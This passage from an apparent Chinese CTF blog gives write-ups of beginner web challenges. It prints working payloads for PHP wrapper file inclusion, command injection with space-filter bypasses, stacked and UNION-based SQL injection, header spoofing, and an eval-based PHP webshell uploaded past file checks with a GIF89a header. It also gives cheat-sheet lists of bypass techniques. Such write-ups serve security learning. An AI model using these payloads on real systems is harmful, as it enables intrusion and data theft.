href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><h3 id="一、本题做题思路-3"><a href="#一、本题做题思路-3" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后就是一个tips</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725568.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点开后查看源代码也没得到什么线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725580.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">结合上面的payload，考虑到php伪协议，所以可以构建payload</p><blockquote><p>url+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 对其进行编码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725590.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-1"><a href="#二、本题知识点-1" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>常见的五种PHP伪协议</p><p><strong>（1）php:&#x2F;&#x2F;input (碰到file_get_contents()可以通过此绕过)</strong></p><blockquote><p>用法：?file &#x3D;php:&#x2F;&#x2F;input  使数据利用post传过去</p></blockquote><p><strong>（2）php:&#x2F;&#x2F;filter (用来读取文件内容)</strong></p><blockquote><p>用法：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p><p>​      ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p></blockquote><p><strong>(3) zip:&#x2F;&#x2F; (可以访问压缩包里的内容)</strong></p><blockquote><p>用法:  zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内的文件]</p><p>​      ?file&#x3D;zip:&#x2F;&#x2F;D:\zip.zip%23phpinfo.txt</p></blockquote><p><strong>(4) phar:&#x2F;&#x2F; (与zip:&#x2F;&#x2F;相同)</strong></p><blockquote><p>用法: ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php (zip要用#隔开，这个用&#x2F;)</p></blockquote><p><strong>(5) data:&#x2F;&#x2F; (读取文件)</strong></p><blockquote><p>用法: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;<br>     ?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p></blockquote><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h3 id="一、本题做题思路-4"><a href="#一、本题做题思路-4" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合打开网站所给提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726553.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先ping一下本地网址，查询所有</p><p><strong>payload: 127.0.0.1;ls &#x2F;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>看到flag，尝试获取他，通过cd可以达到访问上一个目录的目的</p><p>所以可以构造 <strong>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag</strong> 得到flag</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="一、本题解题思路"><a href="#一、本题解题思路" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p>打开页面根据网站名字，是sql注入，所以尝试下注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727066.png"></p><p>尝试通过select，发现过滤掉很多关键词</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727048.png"></p><p>基本上不考虑联合注入，报错注入了，可以尝试堆叠注入，</p><p>先判断是什么闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727995.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727980.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 是’闭合，所以通过此来进行堆叠注入爆库  <strong>1’;show tables– q</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728364.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现两张表，尝试一下爆表,先爆words  <strong>1’;show columns from <code>words</code>– q</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728398.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>再尝试下爆190那个表  <strong>1’;show columns from <code>1919810931114514</code>– q</strong>  发现有flag线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728905.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 但是，如果要接着直接查这个flag就会出现问题了，select等关键词被过滤了，所以我们只能另辟蹊径，根据从网上大佬的wp学习，可以将<strong>1919810931114514</strong>改名为<strong>words</strong>这个表，然后再将<strong>words</strong>这个表改成其他名字，添加<strong>id</strong>字段，将<strong>flag</strong>改为<strong>data</strong>，最后通过系统的select帮我们查出flag具体代码如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;</span><span class="number">12</span><span class="string">&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>然后通过  <strong>1’ or 1&#x3D;1;#</strong>  直接得到flag。如果不放心，你也可以通过上面的爆表，爆库确认一下是否改名成功，有所变化。</p><h3 id="二、本题知识点-2"><a href="#二、本题知识点-2" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、为什么再爆库，爆表时候要用&#96;&#96;包住表</p><p><strong>反单引号：它是为了区分MySQL的保留字与普通字符而引入的符号。当表名、字段名为一些保留字的时候，如果不用反单引号标注，执行SQL的时候会报错。数据库、表、索引、列和别名用的是引用符是反单引号。</strong></p><p>(2)、<a href="https://blog.csdn.net/qq_45927819/article/details/123594626">大佬博客</a> 对堆叠注入原理和触发条件做了解释，并以此题为例题进行讲解。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="一、本题解题思路-1"><a href="#一、本题解题思路-1" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p> 从本题题目猜测大概和Exec那题差不多，打开网页发现只是需要通过get传参来进行ping</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730254.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 跟上题一样先查询一下，得到flag线索 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;ls</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730276.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>尝试抓取一下这个flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730237.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现他将空格过滤了，不过通过网上学习，发现可以用一些字符绕过空格，例如 <strong>$IFS$9  ${IFS} %09 等 ，</strong>所以我们尝试拼接url一下来重新抓取flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat${IFS}flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731227.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">应该是还过滤一些符号，这里可能过滤{},所以我们换个空格绕过字符: </p><p> <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731195.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现其过滤flag这个字符。只能再回头看看线索了，当时不仅有flag.php,还有一个index.php。所以我们可以去查看一下这个 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9index.php</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731211.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现里面过滤了很多字符，不过定义了一个变量**$a<strong>，可以通过这个</strong>$a**完成绕过</p><p>拼接url:  <strong>url+&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php。</strong>访问后从源代码找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731199.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> <strong>二、本题知识点</strong></p><p> (1)、<strong>空格绕过</strong>，本题除了我上面所说的那几天空格绕过方法，还有类似于 <strong>&lt;&gt; ${IFS &lt; %20</strong>以及我上面所说的那几个。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="一、本题做题思路-5"><a href="#一、本题做题思路-5" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合题目又是一道sql注入题， </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733865.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>先判断下闭合方式，发现用’闭合时回显为空白，用”闭合回显为nonono，猜测为’闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733861.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733867.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过fuzz测试发现;可以使用，所以我们尝试下堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733873.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现flag，尝试抓取它</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733875.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 但是回显是nonono。到这基本上我就寄了，转去网上找大佬wp学习</p><p>大佬猜测后端是如下代码，有着一个或结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>所以只需要将**$_POST[‘query’]** 变成 ***,1**便可以得到flag 。此时语句会变成</p><p><strong>select *,1 from flag  等同于 1 || flag</strong> 短路语法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733869.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>二、本题知识点</strong> </p><p>(1)、短路语法</p><blockquote><p>|| 逻辑或的短路也是类似的，a||b</p><p>计算机发现a是真，那么扔a；如果a是假，那么扔b</p><p>a||b， 计算机要么执行a要么执行b。a真执行a，a假执行b。</p></blockquote><p>所以 <strong>select 1 from flag的意思其实是建立一个临时列，这个列的所有初始值都被设为1</strong></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="一、本题解题思路-2"><a href="#一、本题解题思路-2" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734210.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 看着这个页面什么也没法得到，所以只能从源代码里面找线索了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734454.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 发现有个php 点击去看看</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734000.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点击这个SECRET 发现什么都得不到，说我们已经查阅成功没看清，所以可以考虑一下bp抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734961.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以通过BP抓包，果然在其回显中发现线索，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734023.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 打开这个php，发现是一个代码审计</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734012.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 如果傻傻的去访问这个flag.php，那么依旧是什么都得不到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734008.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 结合这句话和代码审计里面的 input data。很难不让人想到php伪协议，</p><p>所以我们可以构建这个url </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到一大串base64编码，解密一下就可以得到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735713.png"><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a><strong>[极客大挑战 2019]LoveSQL</strong></h2><h3 id="一、本题解题思路-3"><a href="#一、本题解题思路-3" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">啊，依旧是一道sql注入题，先看看闭合式吧</p><p>发现用1’是有报错，而1”回显错误账号和密码，所以猜测为用’闭合 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736511.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 用联合注入爆破所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736319.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">尝试爆该表字段，构造url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到其中字段</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736152.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们在抓取其中字段内容，构造url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/check.php?username=1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736406.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-3"><a href="#二、本题知识点-3" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>联合查询注入(UNION query SQL injectio)<br>获取所有数据库名：<br>union select 1,2,group_concat(schema_name)  from information_schema.schemata –%20</p><p>获取指定数据库下所有表名：<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘库名’ –%20</p><p>获取指定表下所有字段名：<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表名’ –%20</p><p>获取字段内容</p><p>union select 1,2,group_concat(字段1,字段2,字段3) from 表名 –%20</p></blockquote><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h3 id="一、本题做题思路-6"><a href="#一、本题做题思路-6" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>同样的，在主页面什么都找不到，只能从源代码里面找线索咯</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738498.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">点击这个php里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">说我们不是来自这个网站，所以我们可以选择用BP抓一下包，改一下来源</p><p>在BP中添加一个 <strong>Referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738605.png"></p><p>他又说我们没用这个Syclover浏览器访问，那我们再改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739672.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 又说我们必须本地来读取它，通过加入XFF得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739692.png"></p><h3 id="二、本题知识点-4"><a href="#二、本题知识点-4" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p> X-Forwarded-For  (XFF) 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>Rerferer: url 代表用所需的网站进行访问</p><p>User-Agent: 代理浏览器</p></blockquote><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h3 id="一、本题做题思路-7"><a href="#一、本题做题思路-7" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开这个网页就直接给出了提示，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740442.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">放入蚁剑里，通过所POST的作为密码从而连接进入这个网站</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740430.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 然后成功添加后，用其虚拟终端输入 <strong>cat &#x2F;flag</strong> 得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740419.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="一、本题做题思路-8"><a href="#一、本题做题思路-8" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>上传题，先上传个php文件看看回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看来没戏，尝试用图片绕过，然后BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741781.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 发现其还会对图片内容进行读取，所以我们需要修改图片里的内容，将里面的一句话木马换种方式书写，将其修改为如下代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;ru&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还是不行，又出现一个新的回显， <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742216.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到了这步就要用到一个新的东西，即<strong>文件幻术头绕过</strong>，详情可看这位<a href="https://blog.csdn.net/since_2020/article/details/119414380">大佬博客</a>来进行了解</p><p>总之就是要在上面所述代码内容上面再添加图片文件头(十六进制转换为的字符)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;ru&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显虽然是上传成功，但是无法从蚁剑内连接进入，通过BP将其后缀修改为.phtml（这里如果你把后缀改成.php7 虽然绕过他对php的检查，但是没法蚁剑连接不进去，也可能是我自己的问题。）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742189.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">构造payload   <strong>url+&#x2F;upload&#x2F;xxxx.phtml</strong> 放入蚁剑内连接进入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742206.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后跟上题一样，打开虚拟终端  <strong>cat &#x2F;flag</strong>  得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742184.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-5"><a href="#二、本题知识点-5" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、文件上传后缀绕过，这在打upload-labs靶场时就能积累一些，例如大小写绕过.Php等<strong>。&#x2F;&#x2F;<strong>空格绕过xxx. php等</strong>。&#x2F;&#x2F;</strong>::$DATA，在windows php里面，文件名后加入此字符，系统会将此文件当文件流处理，不会检测其后缀名<strong>。&#x2F;&#x2F;<strong>双写绕过，例如xxx.pphphp等</strong>。&#x2F;&#x2F;</strong>%00截断，这个好像要考虑php版本。</p><p>(2)、文件幻术头绕过，如上面所说，可以去看那位大佬的博客了解一下。</p></blockquote><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><h3 id="一、本题做题思路-9"><a href="#一、本题做题思路-9" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743773.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>当你把鼠标移到灯泡的时候就会发现其实是一个上传题，所以老规矩先看看php回显不。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743760.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们还是需要上传图片然后再通过BP抓包进行修改。发现回显显示上传成功 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743771.png"> 